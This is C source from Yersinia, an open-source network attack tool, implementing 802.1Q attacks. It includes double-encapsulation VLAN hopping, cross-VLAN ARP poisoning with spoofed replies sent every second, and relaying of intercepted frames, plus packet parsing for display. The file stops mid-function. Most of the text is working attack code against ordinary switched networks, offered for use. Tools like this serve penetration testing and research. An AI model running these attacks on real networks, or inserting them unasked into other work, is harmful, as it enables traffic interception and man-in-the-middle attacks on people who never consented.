/* dot1q.c
 * Implementation and attacks for IEEE 802.1Q
 *
 * Yersinia
 * By David Barroso <tomac@yersinia.net> and Alfredo Andres <slay@yersinia.net>
 * Copyright 2005, 2006, 2007 Alfredo Andres and David Barroso
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
 */

#ifndef lint
static const char rcsid[] = 
       "$Id: dot1q.c 43 2007-04-27 11:07:17Z slay $";
#endif

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#define _REENTRANT

#include <stdio.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>       

#ifdef HAVE_NETINET_IN_SYSTM_H
#include <netinet/in_systm.h>
#else
#ifdef HAVE_NETINET_IN_SYSTEM_H
#include <netinet/in_system.h>
#endif
#endif

#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <time.h>

#ifdef TIME_WITH_SYS_TIME
#include <sys/time.h>
#endif

#ifdef HAVE_UNISTD_H
#include <unistd.h>
#endif

#ifdef HAVE_STRING_H
#include <string.h>
#endif

#ifdef HAVE_STRINGS_H
#include <strings.h>
#endif

#ifdef HAVE_BSTRING_H
#include <bstring.h>
#endif

#ifdef STDC_HEADERS
#include <stdlib.h>
#endif

#ifdef HAVE_PTHREAD_H
#include <pthread.h>
#endif

#include <stdarg.h>

#include "dot1q.h"


void
dot1q_register(void)
{
   protocol_register(PROTO_DOT1Q, "802.1Q", "IEEE 802.1Q", "dot1q", 
         sizeof(struct dot1q_data), dot1q_init_attribs, dot1q_learn_packet,
         dot1q_get_printable_packet, dot1q_get_printable_store,
         dot1q_load_values, dot1q_attack, dot1q_update_field, 
         dot1q_features, dot1q_comm_params, SIZE_ARRAY(dot1q_comm_params), 
         NULL, 0, NULL, dot1q_init_comms_struct, PROTO_VISIBLE, dot1q_end);
}

/*
 * Inicializa la estructura que se usa para relacionar el tmp_data
 * de cada nodo con los datos que se sacaran por pantalla cuando
 * se accede al demonio de red.
 * Teoricamente como esta funcion solo se llama desde term_add_node()
 * la cual, a su vez, solo es llamada al tener el mutex bloqueado por
 * lo que no veo necesario que sea reentrante. (Fredy). 
 */
int8_t
dot1q_init_comms_struct(struct term_node *node)
{
    struct dot1q_data *dot1q_data;
    void **comm_param;
 
    comm_param = (void *)calloc(1,sizeof(void *)*SIZE_ARRAY(dot1q_comm_params));
    
    if (comm_param == NULL)
    {
       thread_error("dot1q_init_commands_struct calloc error",errno);
       return -1;
    }

    dot1q_data = node->protocol[PROTO_DOT1Q].tmp_data;
    
    node->protocol[PROTO_DOT1Q].commands_param = comm_param;
    
    comm_param[0] =  &dot1q_data->mac_source; 
    comm_param[1] =  &dot1q_data->mac_dest;
    comm_param[2] =  &dot1q_data->vlan1; 
    comm_param[3] =  &dot1q_data->priority1;
    comm_param[4] =  &dot1q_data->cfi1; 
    comm_param[5] =  &dot1q_data->tpi2; 
    comm_param[6] =  &dot1q_data->vlan2; 
    comm_param[7] =  &dot1q_data->priority2;
    comm_param[8] =  &dot1q_data->cfi2;
    comm_param[9] =  &dot1q_data->tpi3;
    comm_param[10] = &dot1q_data->src_ip;  
    comm_param[11] = &dot1q_data->dst_ip; 
    comm_param[12] = &dot1q_data->ip_proto; 
    comm_param[13] = &dot1q_data->icmp_payload;
    comm_param[14] = NULL; 
    comm_param[15] = NULL; 
    
    return 0;
}



void
dot1q_th_send(void *arg)
{
    struct attacks *attacks=NULL;
    sigset_t mask;
    struct dot1q_data *dot1q_data;

    attacks = arg;
    
    pthread_mutex_lock(&attacks->attack_th.finished);

    pthread_detach(pthread_self());

    sigfillset(&mask);

    if (pthread_sigmask(SIG_BLOCK, &mask, NULL))
    {
       thread_error("dot1q_th_send pthread_sigmask()",errno);
       dot1q_th_send_exit(attacks);
    }

    dot1q_data = attacks->data;
    
    dot1q_data->tpi1 = ETHERTYPE_VLAN;
                  
    dot1q_data->tpi2 = ETHERTYPE_IP;

    dot1q_send_icmp(attacks,0);

    dot1q_th_send_exit(attacks);
}


void
dot1q_th_send_exit(struct attacks *attacks)
{
    if (attacks)
       attack_th_exit(attacks);
    
    pthread_mutex_unlock(&attacks->attack_th.finished);
    
    pthread_exit(NULL);
}


void
dot1q_double_th_send(void *arg)
{
    struct attacks *attacks=NULL;
    sigset_t mask;
    struct dot1q_data *dot1q_data;

    attacks = arg;
    
    pthread_mutex_lock(&attacks->attack_th.finished);

    pthread_detach(pthread_self());

    sigfillset(&mask);

    if (pthread_sigmask(SIG_BLOCK, &mask, NULL))
    {
       thread_error("dot1q_th_send pthread_sigmask()",errno);
       dot1q_double_th_send_exit(attacks);
    }

    dot1q_data = attacks->data;

    dot1q_data->tpi1 = ETHERTYPE_VLAN;

    dot1q_data->tpi2 = ETHERTYPE_VLAN;
    
    dot1q_send_icmp(attacks,1);

    dot1q_double_th_send_exit(attacks);
}


void
dot1q_double_th_send_exit(struct attacks *attacks)
{
    if (attacks)
       attack_th_exit(attacks);
    
    pthread_mutex_unlock(&attacks->attack_th.finished);
    
    pthread_exit(NULL);
}


int8_t
dot1q_send_icmp(struct attacks *attacks, u_int8_t double_encap)
{
    libnet_ptag_t t;
    libnet_t *lhandler;
    int32_t sent;
    u_int16_t *aux;        
    int32_t payload_size=0;
    struct dot1q_data *dot1q_data;
    u_int8_t *payload=NULL;
    dlist_t *p;
    struct interface_data *iface_data;
    struct interface_data *iface_data2;
    
    dot1q_data = attacks->data;

    dot1q_data->icmp_pay_len = strlen((const char *)dot1q_data->icmp_payload);
    
      /* 802.1Q Double encap. */
    if (double_encap)
    {
       payload_size=4;
       payload = (u_int8_t *)calloc(payload_size,1);
       if (payload == NULL)
       {
          thread_error("dot1q payload calloc()",errno);
          return -1;
       }
       aux = (u_int16_t *)(payload);
       *aux = htons((dot1q_data->priority2 << 13) | (dot1q_data->cfi2 << 12)
                     | (dot1q_data->vlan2 & LIBNET_802_1Q_VIDMASK));
         
       aux = (u_int16_t *)(payload+2);
       *aux = htons(dot1q_data->tpi3);
    }

    for (p = attacks->used_ints->list; p; p = dlist_next(attacks->used_ints->list, p)) {
       iface_data = (struct interface_data *) dlist_data(p);
            lhandler = iface_data->libnet_handler;

            t = libnet_build_icmpv4_echo(
                ICMP_ECHO,                     /* type */
                0,                             /* code */
                0,                             /* checksum */
                0x42,                          /* id */
                0x42,                          /* sequence number */
                dot1q_data->icmp_pay_len?dot1q_data->icmp_payload:NULL, /* payload */
                dot1q_data->icmp_pay_len, /* payload size */
                lhandler,                      /* libnet handle */
                0);
            if (t == -1)
            {
                thread_libnet_error("Can't build icmp header",lhandler);
                libnet_clear_packet(lhandler);
                if (payload)
                   free(payload);
                return -1;            
            }

            t = libnet_build_ipv4(
                LIBNET_IPV4_H + LIBNET_ICMPV4_ECHO_H+
                         dot1q_data->icmp_pay_len, /* length */
                0,                        /* TOS */
                0x42,                     /* IP ID */
                0,                        /* IP Frag */
                64,                       /* TTL */
                IPPROTO_ICMP,             /* protocol */
                0,                        /* checksum */
                htonl(dot1q_data->src_ip),  /* source IP */
                htonl(dot1q_data->dst_ip),  /* destination IP */
                NULL,                     /* payload */
                0,                        /* payload size */
                lhandler,                 /* libnet handle */
                0);
            if (t == -1)
            {
                thread_libnet_error("Can't build ip header",lhandler);
                libnet_clear_packet(lhandler);
                if (payload)
                   free(payload);
                return -1;
            }

            t = libnet_build_802_1q(
                  dot1q_data->mac_dest,   /* dest mac */
                  (attacks->mac_spoofing) ? dot1q_data->mac_source : iface_data->etheraddr,
                  dot1q_data->tpi1,       /* TPI */
                  dot1q_data->priority1,  /* priority (0 - 7) */
                  dot1q_data->cfi1,       /* CFI flag */
                  dot1q_data->vlan1,      /* vid (0 - 4095) */
                  dot1q_data->tpi2,
                  payload,         /* payload */
                  payload_size,    /* payload size */
                  lhandler,        /* libnet handle */
                  0);              /* libnet id */

            if (t == -1)
            {
                thread_libnet_error("Can't build 802.1q header",lhandler);
                libnet_clear_packet(lhandler);
                if (payload)
                   free(payload);
                return -1;
            }

            /*
             *  Write it to the wire.
             */
            sent = libnet_write(lhandler);

            if (sent == -1) {
                thread_libnet_error("libnet_write error", lhandler);
                libnet_clear_packet(lhandler);
                if (payload)
                   free(payload);
                return -1;
            }

            libnet_clear_packet(lhandler);
            protocols[PROTO_DOT1Q].packets_out++;
            iface_data2 = interfaces_get_struct(iface_data->ifname);
            iface_data2->packets_out[PROTO_DOT1Q]++;
    }

    if (payload)
       free(payload);    

    return 0;
}


void
dot1q_th_poison(void *arg)
{
    libnet_ptag_t t;
    libnet_t *lhandler;
    struct attacks *attacks=NULL;
    struct dot1q_data *dot1q_data;
    struct pcap_pkthdr header;
    struct pcap_data pcap_aux;
    struct libnet_802_3_hdr *ether;
    struct timeval now;
    u_int8_t *packet=NULL, out=0, arp_mac[ETHER_ADDR_LEN];
    u_int16_t *cursor;
    int32_t sent;    
    sigset_t mask;
    dlist_t *p;
    struct interface_data *iface_data;

    attacks = arg;
    
    pthread_mutex_lock(&attacks->attack_th.finished);

    pthread_detach(pthread_self());
    
    sigfillset(&mask);

    if (pthread_sigmask(SIG_BLOCK, &mask, NULL))
    {
       thread_error("dot1q_th_poison pthread_sigmask()",errno);
       dot1q_th_poison_exit(attacks);
    }

    dot1q_data = attacks->data;

    dot1q_data->tpi1 = ETHERTYPE_VLAN;

    gettimeofday(&now,NULL);
    
    header.ts.tv_sec =  now.tv_sec;
    header.ts.tv_usec = now.tv_usec;

    if (dot1q_learn_mac(attacks, &header, arp_mac) < 0)
        dot1q_th_poison_exit(attacks);

    if ((packet = calloc(1, SNAPLEN)) == NULL)
        dot1q_th_poison_exit(attacks);

    thread_create(&attacks->helper_th.id, &dot1q_send_arp_poison, attacks);
    
    while (!attacks->attack_th.stop && !out)
    {
        interfaces_get_packet(attacks->used_ints, NULL, &attacks->attack_th.stop, &header, packet,
                               PROTO_DOT1Q, NO_TIMEOUT);
        if (attacks->attack_th.stop)
           break;   

        ether = (struct libnet_802_3_hdr *) packet;
        
        iface_data = (struct interface_data *) dlist_data(attacks->used_ints->list);
        if ( memcmp((attacks->mac_spoofing)?dot1q_data->mac_source:iface_data->etheraddr,
                     ether->_802_3_dhost,6))
           continue; /* Not for the poisoned MAC... */
 
        pcap_aux.header = &header;
        pcap_aux.packet = packet;
 
        cursor = (u_int16_t *) (packet + LIBNET_802_3_H);

/*        cursor++; */

/* 802.3
        if (ntohs(*cursor) < 0x0800)
            do_802_3 = 1;
*/        
        for (p = attacks->used_ints->list; p; p = dlist_next(attacks->used_ints->list, p)) {
           iface_data = (struct interface_data *) dlist_data(p);
                lhandler = iface_data->libnet_handler;

                t = libnet_build_ethernet(
                      arp_mac,  /* dest mac */
                      (attacks->mac_spoofing) ? dot1q_data->mac_source : iface_data->etheraddr, /* src mac*/
                      ETHERTYPE_VLAN,       /* type */
                      (u_int8_t *)cursor,   /* payload */
                      header.len - LIBNET_802_3_H, /* payload size */
                      lhandler,             /* libnet handle */
                      0);                   /* libnet id */

                if (t == -1)
                {
                    thread_libnet_error("Can't build Ethernet_II header",lhandler);
                    libnet_clear_packet(lhandler);
                    out = 1;
                    break;
                }

                /*
                 *  Write it to the wire.
                 */
                sent = libnet_write(lhandler);

                if (sent == -1) {
                    thread_libnet_error("libnet_write error", lhandler);
                    libnet_clear_packet(lhandler);
                    out = 1;
                    break;
                }

                libnet_clear_packet(lhandler);
                protocols[PROTO_DOT1Q].packets_out++;
                iface_data->packets_out[PROTO_DOT1Q]++;            
        }                                                                                         
                                                                                        
    } /*...!stop*/    

    /* dot1q_return_mac(attacks, arp_mac); */
    
    free(packet);
    
    dot1q_th_poison_exit(attacks);
}


/* 
 * ARP Poison. Get the real MAC address for arp_ip...
 */
int8_t
dot1q_learn_mac(struct attacks *attacks, struct pcap_pkthdr *header, u_int8_t *arp_mac)
{
   struct dot1q_data *dot1q_data, dot1q_data_learned;
   struct attack_param *param=NULL;
   struct pcap_data pcap_aux;
   struct libnet_802_3_hdr *ether;
   u_int32_t arp_src, arp_dst;
   u_int8_t mac_dest[ETHER_ADDR_LEN];
   u_int8_t arp_mac_dest[ETHER_ADDR_LEN];
   int8_t ret, gotit=0;
   u_int8_t *packet=NULL;
   u_int16_t *cursor, *arp_vlan;
   dlist_t *p;
   struct interface_data *iface_data;

   dot1q_data = attacks->data;

   param = attacks->params;
   arp_vlan = (u_int16_t *)param[DOT1Q_ARP_VLAN].value;

   memcpy((void *)&arp_src, param[DOT1Q_ARP_IP_SRC].value, 4);

   memcpy((void *)&arp_dst, param[DOT1Q_ARP_IP].value, 4);

   memcpy((void *)mac_dest, (void *)"\xff\xff\xff\xff\xff\xff", ETHER_ADDR_LEN);
   memcpy((void *)arp_mac_dest, (void *)"\x00\x00\x00\x00\x00\x00", ETHER_ADDR_LEN);

   header->ts.tv_sec = 0;
   header->ts.tv_usec = 0;

   if ((packet = calloc(1, SNAPLEN)) == NULL)
      return -1;

   while (!attacks->attack_th.stop && !gotit)
   {
      thread_usleep(800000);
      for (p = attacks->used_ints->list; p; p = dlist_next(attacks->used_ints->list, p))
      {
         iface_data = (struct interface_data *) dlist_data(p);
         ret = dot1q_send_arp(iface_data, ARPOP_REQUEST,
               (attacks->mac_spoofing)?dot1q_data->mac_source:iface_data->etheraddr,
               mac_dest,
               (u_int8_t *)&arp_src,
               (u_int8_t *)&arp_dst,
               arp_mac_dest,
               *arp_vlan,
               dot1q_data->priority1);
         if (ret == -1)
         {
            free(packet);
            return ret;
         }
      }

      interfaces_get_packet(attacks->used_ints, NULL, &attacks->attack_th.stop, header, packet,
            PROTO_DOT1Q, NO_TIMEOUT);

      if (attacks->attack_th.stop)
         break;   

      ether = (struct libnet_802_3_hdr *) packet;

      iface_data = (struct interface_data *) dlist_data(attacks->used_ints->list);
      if ( !memcmp((attacks->mac_spoofing)?dot1q_data->mac_source:iface_data->etheraddr, 
               ether->_802_3_shost, 6) )
         continue; /* Oops!! Its our packet... */

      if ( memcmp((attacks->mac_spoofing)?dot1q_data->mac_source:iface_data->etheraddr,
               ether->_802_3_dhost,6))
         continue; /* Not a response... */

      pcap_aux.header = header;
      pcap_aux.packet = packet;

      if (dot1q_load_values(&pcap_aux, &dot1q_data_learned) < 0)
         continue;

      if (dot1q_data_learned.tpi2 != ETHERTYPE_ARP)
         continue;

      cursor = (u_int16_t *) (packet + LIBNET_802_3_H);

      cursor++;

      if (ntohs(*cursor) < 0x0800) /* 802.3 */
         cursor+=4;

      cursor+=2;

      if (ntohs(*cursor) != ETHERTYPE_IP)
         continue;

      cursor+=2;

      if (ntohs(*cursor) != 2 )
         continue;

      cursor+=4;

      if (memcmp((void *)cursor,(void *)&arp_dst,4))
         continue;

      memcpy((void *)arp_mac,(void *)ether->_802_3_shost,6);

      write_log(0, " ARP Spoofing MAC = %02X:%02X:%02X:%02X:%02X:%02X\n",
            ether->_802_3_shost[0], ether->_802_3_shost[1], ether->_802_3_shost[2],
            ether->_802_3_shost[3], ether->_802_3_shost[4], ether->_802_3_shost[5]);

      gotit = 1;

   } /* !stop */

   free(packet);

   if (attacks->attack_th.stop)
      return -1;   

   return 0;
}


/*
 * ARP Poison. Return the MAC to its owner :)...
 */
int8_t
dot1q_return_mac(struct attacks *attacks, u_int8_t *arp_mac)
{
   struct attack_param *param = NULL;
   struct dot1q_data *dot1q_data;
   u_int32_t arp_ip, arp_dst;
   u_int8_t a;
   u_int8_t mac_dest[ETHER_ADDR_LEN];
   u_int16_t *arp_vlan;
   int8_t ret;
   dlist_t *p;
   struct interface_data *iface_data;

   dot1q_data = attacks->data;

   param = attacks->params;
   arp_vlan = (u_int16_t *)param[DOT1Q_ARP_VLAN].value;

   memcpy((void *)&arp_ip,param[DOT1Q_ARP_IP].value,4);
   memcpy((void *)mac_dest, (void *)"\xff\xff\xff\xff\xff\xff", ETHER_ADDR_LEN);
   /*arp_ip = htonl(arp_ip);*/

   arp_dst = 0;

   for ( a=0; a < 3; a++)
   {
      for (p = attacks->used_ints->list; p; p = dlist_next(attacks->used_ints->list, p))
      { 
         iface_data = (struct interface_data *) dlist_data(p);
         ret = dot1q_send_arp(iface_data, ARPOP_REPLY,
               arp_mac,
               mac_dest,
               (u_int8_t *)&arp_ip,
               (u_int8_t *)&arp_dst,
               mac_dest,
               *arp_vlan,
               dot1q_data->priority1);
         if (ret == -1)
            return ret;
      } 
      thread_usleep(999999);
   } 

   return 0;
}


   void
dot1q_th_poison_exit(struct attacks *attacks)
{

   if (attacks)
      attack_th_exit(attacks);

   pthread_mutex_unlock(&attacks->attack_th.finished);

   pthread_exit(NULL);
}


/*
 * Child/Thread loop sending
 * ARP poison every 2 secs...
 */
void
dot1q_send_arp_poison(void *arg)
{
    struct attacks *attacks;
    struct attack_param *param;
    struct dot1q_data *dot1q_data;
    u_int32_t arp_ip, arp_dst;
    u_int8_t out=0;
    u_int8_t mac_dest[ETHER_ADDR_LEN];
    u_int16_t *arp_vlan;
    int8_t ret;
    dlist_t *p;
    struct interface_data *iface_data;

    attacks = arg;
    
    pthread_mutex_lock(&attacks->helper_th.finished);

    pthread_detach(pthread_self());

    dot1q_data = attacks->data;

    param = attacks->params;
    arp_vlan = (u_int16_t *)param[DOT1Q_ARP_VLAN].value;

    memcpy((void *)&arp_ip, param[DOT1Q_ARP_IP].value, 4);
    memcpy((void *)mac_dest, (void*)"\xff\xff\xff\xff\xff\xff", ETHER_ADDR_LEN);
    /*    arp_ip = htonl(arp_ip);*/

    arp_dst = 0;

    while (!attacks->helper_th.stop && !out)
    {
       for (p = attacks->used_ints->list; p; p = dlist_next(attacks->used_ints->list, p))
       {
          iface_data = (struct interface_data *) dlist_data(p);
          ret = dot1q_send_arp(iface_data, ARPOP_REPLY,
                (attacks->mac_spoofing)?dot1q_data->mac_source:iface_data->etheraddr,
                mac_dest,
                (u_int8_t *)&arp_ip,
                (u_int8_t *)&arp_dst,
                mac_dest,
                *arp_vlan,
                dot1q_data->priority1);
          if (ret == -1)
          {
             out = 1;
             break;
          }
       } 
       if (!out)
          thread_usleep(999999);
    }

    pthread_mutex_unlock(&attacks->helper_th.finished);
    
    pthread_exit(NULL);
}


/*
 * Send ARP packet...
 */
int8_t
dot1q_send_arp(struct interface_data *iface, u_int16_t optype, 
               u_int8_t *mac_source, u_int8_t *mac_dest,
               u_int8_t *ip_source, u_int8_t *ip_dest, u_int8_t *arp_mac_dest, 
               u_int16_t vlan, u_int8_t priority)
{
    libnet_ptag_t t;
    libnet_t *lhandler;
    int32_t sent;
    
    lhandler = iface->libnet_handler;
    
    t = libnet_build_arp(
            ARPHRD_ETHER, /* hardware addr */
            ETHERTYPE_IP, /* protocol addr */
            6,            /* hardware addr size */
            4,            /* protocol addr size */
            optype,       /* operation type */
            (u_int8_t *)mac_source,   /* sender hardware address */
            ip_source,    /* sender protocol addr */
            (u_int8_t *)arp_mac_dest, /* target hardware addr */
            ip_dest,      /* target protocol addr */
            NULL,         /* payload */
            0,            /* payload size */
            lhandler,     /* libnet context */
            0);           /* libnet id */
    if (t == -1)
    {
        thread_libnet_error("Can't build arp header",lhandler);
        libnet_clear_packet(lhandler);
        return -1;
    }

    t = libnet_build_802_1q(
          mac_dest,       /* dest mac */
          mac_source,     /* src mac */
          ETHERTYPE_VLAN, /* TPI */
          priority,       /* priority (0 - 7) */
          0,              /* CFI flag */
          vlan,           /* vid (0 - 4095) */
          ETHERTYPE_ARP, 
          NULL,           /* payload */
          0,              /* payload size */
          lhandler,       /* libnet handle */
          0);             /* libnet id */

    if (t == -1)
    {
        thread_libnet_error("Can't build 802.1q header",lhandler);
        libnet_clear_packet(lhandler);
        return -1;
    }

    /*
     *  Write it to the wire.
     */
    sent = libnet_write(lhandler);

    if (sent == -1) {
        thread_libnet_error("libnet_write error", lhandler);
        libnet_clear_packet(lhandler);
        return -1;
    }

    libnet_clear_packet(lhandler);
    protocols[PROTO_DOT1Q].packets_out++;
    iface->packets_out[PROTO_DOT1Q]++;

    return 0;
}


int8_t
dot1q_init_attribs(struct term_node *node)
{
    struct dot1q_data *dot1q_data;

    dot1q_data = node->protocol[PROTO_DOT1Q].tmp_data;

    attack_gen_mac(dot1q_data->mac_source);

    dot1q_data->mac_source[0] &= 0x0E; 
    
    parser_vrfy_mac(DOT1Q_DFL_MAC_DST,dot1q_data->mac_dest);
    
    dot1q_data->tpi1      = DOT1Q_DFL_TPI1;
    dot1q_data->priority1 = DOT1Q_DFL_PRIO1;
    dot1q_data->cfi1      = DOT1Q_DFL_CFI1;
    dot1q_data->vlan1     = DOT1Q_DFL_VLAN1;

    dot1q_data->tpi2      = DOT1Q_DFL_TPI2;
    dot1q_data->priority2 = DOT1Q_DFL_PRIO2;
    dot1q_data->cfi2      = DOT1Q_DFL_CFI2;
    dot1q_data->vlan2     = DOT1Q_DFL_VLAN2;
    dot1q_data->tpi3      = DOT1Q_DFL_TPI3;

    dot1q_data->src_ip = ntohl(inet_addr("10.0.0.1"));
    dot1q_data->dst_ip = ntohl(inet_addr("255.255.255.255"));

    dot1q_data->ip_proto = 1;
    
    memcpy(dot1q_data->icmp_payload,DOT1Q_DFL_PAYLOAD,sizeof(DOT1Q_DFL_PAYLOAD));
    
    dot1q_data->icmp_pay_len = DOT1Q_DFL_PAY_LEN;
    
    return 0;
}


int8_t
dot1q_learn_packet(struct attacks *attacks, char *iface, u_int8_t *stop, void *data, struct pcap_pkthdr *header)
{
    struct dot1q_data *dot1q_data;
    struct pcap_data pcap_aux;
    u_int8_t *packet, got_802_1q_pkt = 0;
    u_int16_t *cursor;
    dlist_t *p;
    struct interface_data *iface_data;
    
    dot1q_data = data;

    if ((packet = calloc(1, SNAPLEN)) == NULL)
        return -1;

    if (iface) {
       p = dlist_search(attacks->used_ints->list, attacks->used_ints->cmp, iface);
       if (!p)
          return -1;

       iface_data = (struct interface_data *) dlist_data(p);
    } else
       iface_data = NULL;

    while (!got_802_1q_pkt && !(*stop))
    {
        interfaces_get_packet(attacks->used_ints, iface_data, stop, header, packet, PROTO_DOT1Q, NO_TIMEOUT);
           
        if (*stop)
        {
            free(packet);
            return -1;
        }

        cursor = (u_int16_t *)(packet + 12);

        pcap_aux.header = header;
        pcap_aux.packet = packet;
                                                                                          
        if (!dot1q_load_values((struct pcap_data *)&pcap_aux, dot1q_data))
           got_802_1q_pkt = 1;
        
    } /* While got */

    free(packet);

    return 0;
}


/* 
 * Load values from packet to data.
 * At the moment this function is called only 
 * from ncurses-gui.c
 */
int8_t
dot1q_load_values(struct pcap_data *data, void *values)
{
    struct libnet_802_3_hdr *ether;
    struct dot1q_data *dot1q;
    u_int16_t *cursor;
    u_int8_t *ip;
#ifndef LBL_ALIGN
    struct libnet_ipv4_hdr *ipv4_hdr;
#endif

    dot1q = (struct dot1q_data *)values;
    if (data->header->caplen < (14+8+8) ) /* Undersized packet!! */
       return -1;
       
    ether = (struct libnet_802_3_hdr *) data->packet;

    /* Source MAC */
    memcpy(dot1q->mac_source, ether->_802_3_shost, ETHER_ADDR_LEN);
    /* Destination MAC */
    memcpy(dot1q->mac_dest, ether->_802_3_dhost, ETHER_ADDR_LEN);
    
    cursor = (u_int16_t *) (data->packet + LIBNET_802_3_H);
    
    dot1q->priority1 = ntohs(*cursor) >> 13;
    dot1q->cfi1      = ntohs(*cursor) & 0x1000;
    dot1q->vlan1     = ntohs(*cursor) & 0xfff;
    cursor++;
    dot1q->tpi2      = ntohs(*cursor);

    switch(dot1q->tpi2)
    {
       case ETHERTYPE_IP:
       break;

       case ETHERTYPE_VLAN:
            cursor++;
            dot1q->priority2 = ntohs(*cursor) >> 13;
            dot1q->cfi2      = ntohs(*cursor) & 0x1000;
            dot1q->vlan2     = ntohs(*cursor) & 0xfff;
            cursor++;
            dot1q->tpi3      = ntohs(*cursor);

            if (dot1q->tpi3 != ETHERTYPE_IP)
               return 0;
       break;

       default:
            return 0;
       break;
    }

    cursor++; /* Minimal IP header needed */

    ip = (u_int8_t *)cursor;
                                /* Undersized packet!! */
    if ( (ip+20) > (data->packet + data->header->caplen))
       return 0;

#ifdef LBL_ALIGN
    dot1q->ip_proto = *(ip+9);
    memcpy((void *)&dot1q->src_ip, (ip+12), 4);
    memcpy((void *)&dot1q->dst_ip, (ip+16), 4);
#else
    ipv4_hdr = (struct libnet_ipv4_hdr *)cursor;
    dot1q->src_ip   = ntohl(ipv4_hdr->ip_src.s_addr);
    dot1q->dst_ip   = ntohl(ipv4_hdr->ip_dst.s_addr);
    dot1q->ip_proto = ipv4_hdr->ip_p;
#endif

    return 0;
}



/* 
 * Return formated strings of each 802.1Q field
 */
char **
dot1q_get_printable_packet(struct pcap_data *data)
{
    struct libnet_802_3_hdr *ether;
    struct libnet_ipv4_hdr *ipv4_hdr;
    u_int16_t *cursor, type_cursor;
    u_int8_t *ip;
    char *aux;
    u_int32_t aux_long;
    char **field_values;

    if (data && (data->header->caplen < (14+8+8)) ) /* Undersized packet!! */
       return NULL;

    if ((field_values = (char **) protocol_create_printable(protocols[PROTO_DOT1Q].nparams, protocols[PROTO_DOT1Q].parameters)) == NULL) {
	    write_log(0, "Error in calloc\n");
	    return NULL;
    }

    ether = (struct libnet_802_3_hdr *) data->packet;

    /* Source MAC */
    snprintf(field_values[DOT1Q_SMAC], 18, "%02X:%02X:%02X:%02X:%02X:%02X",
       ether->_802_3_shost[0], ether->_802_3_shost[1], ether->_802_3_shost[2],
       ether->_802_3_shost[3], ether->_802_3_shost[4], ether->_802_3_shost[5]);
    /* Destination MAC */
    snprintf(field_values[DOT1Q_DMAC], 18, "%02X:%02X:%02X:%02X:%02X:%02X",
       ether->_802_3_dhost[0], ether->_802_3_dhost[1], ether->_802_3_dhost[2],
       ether->_802_3_dhost[3], ether->_802_3_dhost[4], ether->_802_3_dhost[5]);
    
    cursor = (u_int16_t *) (data->packet + LIBNET_802_3_H);
    
    snprintf(field_values[DOT1Q_VLAN1], 5, "%04d", (ntohs(*cursor) & 0xfff));
    snprintf(field_values[DOT1Q_PRIORITY1], 3, "%02X", (ntohs(*cursor) >> 13));
    snprintf(field_values[DOT1Q_CFI1], 3, "%02X", (ntohs(*cursor) & 0x1000));
    cursor++;

    type_cursor = ntohs(*cursor);

    if (type_cursor < 0x0800) /* 802.3 */
    {
       cursor+=4;
       type_cursor = ntohs(*cursor);
    }

    switch(type_cursor)
    {
       case ETHERTYPE_IP:
           snprintf(field_values[DOT1Q_TPI2], 5, "%04X",type_cursor);
           field_values[DOT1Q_PRIORITY2][0]=0;
           field_values[DOT1Q_CFI2][0]=0;
           field_values[DOT1Q_VLAN2][0]=0;
       break;

       case ETHERTYPE_VLAN:
            snprintf(field_values[DOT1Q_TPI2], 5, "%04X",type_cursor);
            cursor++;
            snprintf(field_values[DOT1Q_PRIORITY2], 3, "%02X", (ntohs(*cursor) >> 13));
            snprintf(field_values[DOT1Q_CFI2], 3,  "%02X",(ntohs(*cursor) & 0x1000));
            snprintf(field_values[DOT1Q_VLAN2], 5, "%04d", (ntohs(*cursor) & 0xfff));
            cursor++;
            type_cursor = ntohs(*cursor);

            switch(type_cursor)
            {
                case ETHERTYPE_IP:
                    snprintf(field_values[DOT1Q_TPI3], 5, "%04X",type_cursor);
                break;
                case ETHERTYPE_ARP:
                    snprintf(field_values[DOT1Q_TPI3], 5, "%04X",type_cursor);
                    field_values[DOT1Q_SRC_IP][0] = 0;
                    field_values[DOT1Q_DST_IP][0] = 0;
                    return (char **)field_values;
                break;
                case ETHERTYPE_REVARP:
                    snprintf(field_values[DOT1Q_TPI3], 5, "%04X",type_cursor);
                    field_values[DOT1Q_SRC_IP][0] = 0;
                    field_values[DOT1Q_DST_IP][0] = 0;
                    return (char **)field_values;
                break;
                case ETHERTYPE_VLAN:
                    snprintf(field_values[DOT1Q_TPI3], 5, "%04X",type_cursor);
                    field_values[DOT1Q_SRC_IP][0]   = 0;
                    field_values[DOT1Q_DST_IP][0]   = 0;
                    return (char **)field_values;
                break;
                case 0x010b:
                    snprintf(field_values[DOT1Q_TPI3], 5, "%04X",type_cursor);
                    field_values[DOT1Q_SRC_IP][0] = 0;
                    field_values[DOT1Q_DST_IP][0] = 0;
                    return (char **)field_values;
                break;
                case 0x2000:
                    snprintf(field_values[DOT1Q_TPI3], 5, "%04X",type_cursor);
                    field_values[DOT1Q_SRC_IP][0] = 0;
                    field_values[DOT1Q_DST_IP][0] = 0;
                    return (char **)field_values;
                break;
                case 0x2003:
                    snprintf(field_values[DOT1Q_TPI3], 5, "%04X",type_cursor);
                    field_values[DOT1Q_SRC_IP][0] = 0;
                    field_values[DOT1Q_DST_IP][0] = 0;
                    return (char **)field_values;
                break;
                case 0x2004:
                    snprintf(field_values[DOT1Q_TPI3], 5, "%04X",type_cursor);
                    field_values[DOT1Q_SRC_IP][0] = 0;
                    field_values[DOT1Q_DST_IP][0] = 0;
                    return (char **)field_values;
                break;
                case 0x9000:
                    snprintf(field_values[DOT1Q_TPI3], 5, "%04X",type_cursor);
                    field_values[DOT1Q_SRC_IP][0] = 0;
                    field_values[DOT1Q_DST_IP][0] = 0;
                    return (char **)field_values;
                break;
                default:
                    if (type_cursor < 0x0800)
                    {
                        cursor+=4;
                       
                    }
                    else
                       snprintf(field_values[DOT1Q_TPI3], 5, "%04X", type_cursor);
                    field_values[DOT1Q_SRC_IP][0]   = 0;
